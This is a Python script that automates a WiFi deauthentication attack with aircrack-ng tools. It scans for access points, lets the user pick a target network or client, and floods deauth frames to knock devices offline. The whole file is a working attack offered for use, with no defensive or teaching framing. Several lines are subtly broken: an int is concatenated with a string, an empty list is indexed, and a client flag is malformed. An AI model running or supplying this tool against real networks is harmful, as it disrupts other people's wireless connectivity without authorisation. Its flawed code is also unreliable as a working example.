import subprocess
import csv
from os import system
import time 

# bind input to raw_input in Python 2 to ensure compatibility
try:
   input = raw_input
except NameError:
   pass



# ----------------------------------------------------------
# Scan available access points, user selects by name 
# ----------------------------------------------------------

subprocess.call(['airmon-ng', 'start', 'wlan0'])
p = subprocess.Popen(['airodump-ng', 'wlan0mon', '-c', '6', '-w', 'deauth_aps', '--output-format', 'csv'])
time.sleep(10)
p.terminate()


choice = input("Empty for MAC address, anything else for ESSID (name)")
macAddr = ''
channel = ''
if choice != '':
    name = ' ' + input("Input Access Point ESSID (name): ")
    with open('deauth_aps-01.csv') as f:
        for row in f:
            line = row.split(',')
            # If you take in some argument here instead of hardcoded AP name
            if (name in line):
                macAddr = line[0]
                channel = line[3].replace(" ", "")
else:
    macAddr = input("Input MAC address: ")
    with open('deauth_aps-01.csv') as f:
        for row in f:
            line = row.split(',')
            # If you take in some argument here instead of hardcoded AP name
            if (macAddr in line):
                channel = line[3].replace(" ", "")

print("AP channel: " + channel)


# ----------------------------------------------------------
# Change channel to match selected AP
# ----------------------------------------------------------
time.sleep(4)
subprocess.call(['iwconfig', 'wlan0mon', 'channel', channel])
#subprocess.call(['airmon-ng', 'start', 'wlan0mon', channel])
#p2 = subprocess.Popen(['airodump-ng', 'wlan0mon', '-c', channel])
#time.sleep(1)
#p2.terminate()
subprocess.call(['iwlist', 'wlan0mon', 'channel'])


# ----------------------------------------------------------
# Ask user to specify broadcast or specific deauth
# Send broadcast deauth to AP, or scan clients connected to AP and send deauth to specified client
# ----------------------------------------------------------

print("Broadcast or specific client?")
ans = input("Leave empty for broadcast, input anything to scan clients and specify target: ")

if ans == '':
    # Send broadcast deauth to AP
    # Transmits unlimited deauth packets for 10 seconds
    #p = subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', macAddr, 'wlan0mon'])
    #time.sleep(10)
    #p.terminate()
    subprocess.call(['aireplay-ng', '--deauth', '15', '-a', macAddr, 'wlan0mon'])        
else:
    # Scan clients on specified access point, user selects target by index
    # Scan with AP's channel to ensure success of scan and deauth
    p = subprocess.Popen(['airodump-ng', 'wlan0mon', '--bssid', macAddr, '-c', channel, '-w', 'deauth_clients', '--output-format', 'csv'])
    time.sleep(10)
    p.terminate()

    clients = []
    count = 1
    with open('deauth_clients-01.csv') as f:
        for row in f:
            line = row.split(',')
            print(count + ".    " + line[0])
            clients[count-1] = line[0]
            count += 1
    choice = input("Input index of desired target: ")
    client_macAddr = clients[choice-1]

    # Send deauth to target client
    # Transmits unlimited deauth packets for 10 seconds
    p = subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', macAddr, 'c', client_macAddr, 'wlan0mon'])
    time.sleep(10)
    p.terminate()


# ----------------------------------------------------------
# Open client scan in new window to observe effect of deauth
# ----------------------------------------------------------

#p = subprocess.Popen(['airodump-ng', 'wlan0mon', '--bssid', macAddr, '-c', channel], creationflags=CREATE_NEW_CONSOLE)
#time.sleep(15)
#p.terminate()

